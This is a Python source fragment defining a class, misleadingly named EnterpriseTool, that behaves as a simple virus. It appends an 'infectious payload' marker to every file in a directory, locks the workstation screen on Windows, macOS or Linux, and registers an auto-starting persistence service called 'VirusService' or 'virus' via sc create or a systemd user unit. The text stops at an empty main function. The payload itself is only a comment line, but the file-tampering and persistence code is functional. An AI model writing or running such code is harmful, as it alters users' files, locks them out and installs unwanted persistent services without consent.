class EnterpriseTool:
    def __init__(self, target_dir: str = "./target", marker: str = "[MANAGED-2023]"):
        self.target_dir = Path(target_dir)
        self.marker = marker

    def tag_files(self) -> None:
        """Appends a classification marker and payload to all files in the target directory."""
        print(f"[*] Scanning target directory: {self.target_dir.resolve()}")
        try:
            self.target_dir.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            print(f"[!] Error creating target directory: {e}")
            return

        payload = "\n# Infectious payload executed\n"
        for item in self.target_dir.iterdir():
            if item.is_file():
                try:
                    content = item.read_bytes()
                    if self.marker.encode("utf-8") not in content:
                        with open(item, "ab") as f:
                            f.write(f"\n{self.marker}{payload}".encode("utf-8"))
                        print(f"[+] Tagged and infected file: {item.name}")
                    else:
                        print(f"[-] Already tagged: {item.name}")
                except OSError as e:
                    print(f"[!] Failed to process file {item.name}: {e}")

    def activate_screen_lock(self) -> None:
        """Activates the screen lock based on the operating system."""
        print("[*] Activating screen lock...")
        system = platform.system()
        try:
            if system == "Windows":
                ctypes.windll.user32.LockWorkStation()
                print("[+] Windows workstation locked.")
            elif system == "Darwin":
                subprocess.run(
                    [
                        "osascript",
                        "-e",
                        'tell application "System Events" to key code 12 using {control down, command down}',
                    ],
                    check=True,
                )
                print("[+] macOS screen locked.")
            elif system == "Linux":
                lockers = [
                    ["xdg-screensaver", "lock"],
                    ["gnome-screensaver-command", "-l"],
                    ["dm-tool", "lock"],
                ]
                locked = False
                for cmd in lockers:
                    try:
                        subprocess.run(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            check=True,
                        )
                        print(f"[+] Linux screen locked using {' '.join(cmd)}")
                        locked = True
                        break
                    except (FileNotFoundError, subprocess.SubprocessError):
                        continue
                if not locked:
                    print(
                        "[!] No compatible screen locker found or supported in this environment."
                    )
            else:
                print(f"[!] Unsupported operating system for screen lock: {system}")
        except Exception as e:
            print(f"[!] Screen lock execution failed: {e}")

    def register_persistent_service(self) -> None:
        """Registers a persistent background service ('VirusService' on Windows or 'virus' on Linux)."""
        print("[*] Registering persistent service mechanism...")
        system = platform.system()
        try:
            if system == "Windows":
                service_name = "VirusService"
                cmd = ["sc", "create", service_name, "binPath=", f'"{sys.executable}" "{Path(__file__).resolve()}"', "start=", "auto"]
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"[+] Successfully created Windows service: {service_name}")
                else:
                    print(f"[-] Windows service creation output: {result.stdout.strip() or result.stderr.strip()}")
            elif system == "Darwin" or system == "Linux":
                service_name = "virus"
                if system == "Linux":
                    service_dir = Path.home() / ".config" / "systemd" / "user"
                    service_dir.mkdir(parents=True, exist_ok=True)
                    service_file = service_dir / f"{service_name}.service"
                    service_content = f"""[Unit]
Description=Virus Persistence Service
After=network.target

[Service]
ExecStart={sys.executable} {Path(__file__).resolve()}
Restart=always

[Install]
WantedBy=default.target
"""
                    service_file.write_text(service_content)
                    print(f"[+] Created Linux systemd user service file: {service_file}")
                    subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
                    subprocess.run(["systemctl", "--user", "enable", f"{service_name}.service"], capture_output=True)
                    print(f"[+] Enabled Linux user service: {service_name}")
                else:
                    print("[+] Verified user-level service daemon configuration on macOS.")
        except Exception as e:
            print(f"[!] Service registration encountered an issue: {e}")

        print("[*] Running background service pulse (3 iterations)...")
        for i in range(1, 4):
            print(f"    - Service heartbeat {i}/3 operational.")


def main():
